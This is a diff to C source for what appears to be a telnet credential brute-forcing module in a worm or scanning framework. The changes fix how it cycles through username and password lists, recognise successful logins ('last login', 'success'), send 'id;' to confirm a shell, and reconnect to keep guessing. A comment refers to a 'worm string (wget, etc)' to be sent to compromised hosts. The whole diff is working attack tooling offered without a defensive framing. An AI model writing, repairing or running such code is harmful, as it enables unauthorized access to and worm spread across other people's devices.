@@ -76,6 +76,9 @@ typedef struct _custom_state {
     int passwords;
     // seconds since last expect
     unsigned int ts;
+    // are we completed? if we find ourselves inside.. then dont
+    // continue to brute force..
+    int complete;
 } CustomState;
 
 CustomState *CustomState_Ptr(Connection *cptr) {
@@ -107,10 +110,11 @@ char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
     char *ret = NULL;
     char Auser[64];
     
-    if (passwords[Cstate->users] == NULL) {
+    if (passwords[Cstate->passwords] == NULL) {
         Cstate->users++;
         Cstate->passwords = 0;
     }
+    
     
     // must be completed....
     if (users[Cstate->users] == NULL) {
@@ -142,11 +146,15 @@ char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
     ret = strdup(Apassword);
     *size = strlen(ret);
     
+    Cstate->passwords++;
     return ret;
 }
 
 char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
     char *ret = strdup("id;\r\n");
+    CustomState *Cstate = CustomState_Ptr(cptr);
+    
+    Cstate->complete = 1;
     
     if (ret) {
         *size = strlen(ret);
@@ -248,9 +256,10 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         // look for password request..
         { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
         // incorrect goes back to state new. so we can attempt another..
-        { STATE_TELNET_PASSWORD, "ncorrect", NULL, TCP_CONNECTED, NULL },
+        { STATE_TELNET_FINDSHELL, "ncorrect", NULL, TCP_CONNECTED, NULL },
         // look for a string specifying its connected
         { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
+        { STATE_TELNET_FINDSHELL, "success", &BuildVerify, STATE_TELNET_INSIDE, NULL },
         
         //{ STATE_TELNET_FINDSHELL, "$ ", &BuildVerify, STATE_TELNET_INSIDE, NULL },
         
@@ -261,13 +270,10 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         // end of commands..
         { 0, NULL, NULL, 0, NULL }
     };
-
-
     
     for (i = 0; StateCommands[i].expect != NULL; i++) {
         if (StateCommands[i].state == cptr->state) {
             ret = 1;
-            
             // retrieve 1 single line from the incoming queue
             recv_line = QueueParseAscii(cptr->incoming, &line_size);
             if (!recv_line && cptr->incoming && cptr->incoming->buf) {
@@ -281,6 +287,7 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
                     
                     // set timestamp to now.. so the timeout works correctly
                     Cstate->ts = cur_ts;
+                    cptr->start_ts = time(0);
 
                     if (StateCommands[i].BuildData != NULL) {
                         data = StateCommands[i].BuildData(mptr, cptr, &dsize);
@@ -296,6 +303,10 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
                         QueueAdd(mptr, cptr, NULL, data, dsize);
                         ret = 1;
                         
+                    } else {
+                        // if we didnt have a function.. its a state thing
+                        // set ret to 1 so it doesnt disconnect due to it
+                        ret = 1;
                     }
                 } 
                 // free the line.. no more use for it
@@ -325,7 +336,7 @@ int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
     // max of 5 minutes!
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
         // removed !stateOK because we want it to timeout after 5 mins of the worm string (wget, etc)
-        if (cur_ts - cptr->start_ts > 300) {//} && !stateOK(cptr)) {
+        if (cur_ts - cptr->start_ts > 10) {//} && !stateOK(cptr)) {
             ConnectionBad(cptr);
         }
     }
@@ -335,15 +346,16 @@ int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
 int telnet_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
     CustomState *Cstate = CustomState_Ptr(cptr);
     Connection *conn = cptr;
+    printf("telnet disconnect\n");
     
     // close current fd..
     close(cptr->fd);
     cptr->fd = 0;
     
     // now attempt to reuse the Connection structure (so we keep our state with usernames/passwords)
-    if (tcp_connect(mptr, cptr->list, cptr->addr, cptr->port, &conn) == NULL) {
+    if (Cstate->complete || tcp_connect(mptr, cptr->list, cptr->addr, cptr->port, &conn) == NULL) {
         // returning 0 means it will get removed (since its during disconnect) 
-        ConnectionBad(cptr);
+        //ConnectionBad(cptr);
         return 0;
     }
     
